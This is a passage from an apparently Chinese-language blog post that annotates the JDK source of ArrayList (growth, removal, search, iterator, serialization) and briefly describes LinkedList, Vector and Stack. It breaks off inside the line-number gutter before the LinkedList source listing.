ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">        grow(minCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">    <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">    <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">        Integer.MAX_VALUE :</span><br><span class="line">    MAX_ARRAY_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    rangeCheck(index);<span class="comment">//判断是否越界</span></span><br><span class="line">    modCount++;<span class="comment">//修改modeCount 因为结构改变了</span></span><br><span class="line">    E oldValue = elementData(index);<span class="comment">//读出要删除的值</span></span><br><span class="line">    <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);<span class="comment">//用复制 覆盖数组数据</span></span><br><span class="line">    elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work  //置空原尾部数据 不再强引用， 可以GC掉</span></span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据下标从数组取值 并强转</span></span><br><span class="line"><span class="function">E <span class="title">elementData</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除该元素在数组中第一次出现的位置上的数据。 如果有该元素返回true，如果false。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[index] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                fastRemove(index);<span class="comment">//根据index删除元素</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[index])) &#123;</span><br><span class="line">                fastRemove(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不会越界 不用判断 ，也不需要取出该元素。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    modCount++;<span class="comment">//修改modCount</span></span><br><span class="line">    <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;<span class="comment">//计算要移动的元素数量</span></span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);<span class="comment">//以复制覆盖元素 完成删除</span></span><br><span class="line">    elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work  //置空 不再强引用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//批量删除</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">removeAll</span><span class="params">(Collection&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">    Objects.requireNonNull(c);<span class="comment">//判空</span></span><br><span class="line">    <span class="keyword">return</span> batchRemove(c, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//批量移动</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">batchRemove</span><span class="params">(Collection&lt;?&gt; c, <span class="keyword">boolean</span> complement)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Object[] elementData = <span class="keyword">this</span>.elementData;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">0</span>, w = <span class="number">0</span>;<span class="comment">//w 代表批量删除后 数组还剩多少元素</span></span><br><span class="line">    <span class="keyword">boolean</span> modified = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//高效的保存两个集合公有元素的算法</span></span><br><span class="line">        <span class="keyword">for</span> (; r &lt; size; r++)</span><br><span class="line">            <span class="keyword">if</span> (c.contains(elementData[r]) == complement) <span class="comment">// 如果 c里不包含当前下标元素， </span></span><br><span class="line">                elementData[w++] = elementData[r];<span class="comment">//则保留</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// Preserve behavioral compatibility with AbstractCollection,</span></span><br><span class="line">        <span class="comment">// even if c.contains() throws.</span></span><br><span class="line">        <span class="keyword">if</span> (r != size) &#123; <span class="comment">//出现异常会导致 r !=size , 则将出现异常处后面的数据全部复制覆盖到数组里。</span></span><br><span class="line">            System.arraycopy(elementData, r,</span><br><span class="line">                             elementData, w,</span><br><span class="line">                             size - r);</span><br><span class="line">            w += size - r;<span class="comment">//修改 w数量</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (w != size) &#123;<span class="comment">//置空数组后面的元素</span></span><br><span class="line">            <span class="comment">// clear to let GC do its work</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = w; i &lt; size; i++)</span><br><span class="line">                elementData[i] = <span class="keyword">null</span>;</span><br><span class="line">            modCount += size - w;<span class="comment">//修改modCount</span></span><br><span class="line">            size = w;<span class="comment">// 修改size</span></span><br><span class="line">            modified = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> modified;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==注==：增删改查中， 增导致扩容，则会修改modCount，删也一定会修改。 改和查一定不会修改modCount。</p><h4 id="contains"><a href="#contains" class="headerlink" title="contains"></a>contains</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通的for循环寻找值，只不过会根据目标对象是否为null分别循环查找。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> indexOf(o) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//普通的for循环寻找值，只不过会根据目标对象是否为null分别循环查找。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * An optimized version of AbstractList.Itr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cursor;       <span class="comment">// index of next element to return //默认是0</span></span><br><span class="line">    <span class="keyword">int</span> lastRet = -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such  //上一次返回的元素 (删除的标志位)</span></span><br><span class="line">    <span class="keyword">int</span> expectedModCount = modCount; <span class="comment">//用于判断集合是否修改过结构的 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cursor != size;<span class="comment">//游标是否移动至尾部</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        checkForComodification();</span><br><span class="line">        <span class="keyword">int</span> i = cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size)<span class="comment">//判断是否越界</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length)<span class="comment">//再次判断是否越界，在 我们这里的操作时，有异步线程修改了List</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        cursor = i + <span class="number">1</span>;<span class="comment">//游标+1</span></span><br><span class="line">        <span class="keyword">return</span> (E) elementData[lastRet = i];<span class="comment">//返回元素 ，并设置上一次返回的元素的下标</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;<span class="comment">//remove 掉 上一次next的元素</span></span><br><span class="line">        <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)<span class="comment">//先判断是否next过</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">        checkForComodification();<span class="comment">//判断是否修改过</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ArrayList.<span class="keyword">this</span>.remove(lastRet);<span class="comment">//删除元素 remove方法内会修改 modCount 所以后面要更新Iterator里的这个标志值</span></span><br><span class="line">            cursor = lastRet; <span class="comment">//要删除的游标</span></span><br><span class="line">            lastRet = -<span class="number">1</span>; <span class="comment">//不能重复删除 所以修改删除的标志位</span></span><br><span class="line">            expectedModCount = modCount;<span class="comment">//更新 判断集合是否修改的标志，</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//判断是否修改过了List的结构，如果有修改，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>ArrayList 的序列化没有直接序列化 elementData，而是根据 size 序列化包含的元素，忽略数组中的其它位置，提高效率并节省空间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException</span>&#123;</span><br><span class="line">    <span class="comment">// fail-fast，后续判断是否有并发处理</span></span><br><span class="line">    <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">    <span class="comment">// 序列化没有标记为 static、transient 的字段，包括 size 等。</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有意义，可以忽略</span></span><br><span class="line">    s.writeInt(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        s.writeObject(elementData[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">        <span class="comment">// ArrayList 被并发处理，发生结构性修改</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    elementData = EMPTY_ELEMENTDATA;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化没有标记为 static、transient 的字段，包括 size 等</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以忽略，跟 writeObject 里面的方法对应</span></span><br><span class="line">    s.readInt(); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 数组扩容</span></span><br><span class="line">        ensureCapacityInternal(size);</span><br><span class="line"></span><br><span class="line">        Object[] a = elementData;</span><br><span class="line">        <span class="comment">// 反序列化元素并填充到数组中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            a[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><p>LinkedList 继承自 AbstractSequentialList。AbstractSequentialList 又继承自AbstractList，并且基于 iterator 实现了默认增删改查操作。</p><p><img src="/2020/Java-Collection-sourcecode/LinkedList.jpg" alt="LinkedList"></p><p>文末附完整源码。</p><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>线程安全的 ArrayList。Vector 和 ArrayList 一样都继承自 AbstractList，除了 Vector 的方法上多了个 synchronized 外，代码都是一样的。效率相对会比较低。</p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack 继承自Vector，也是一个线程安全的集合。基于数组实现栈结构集合。</p><p><img src="/2020/Java-Collection-sourcecode/Stack.jpg" alt="Stack"></p><p>LinkedList 完整源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span 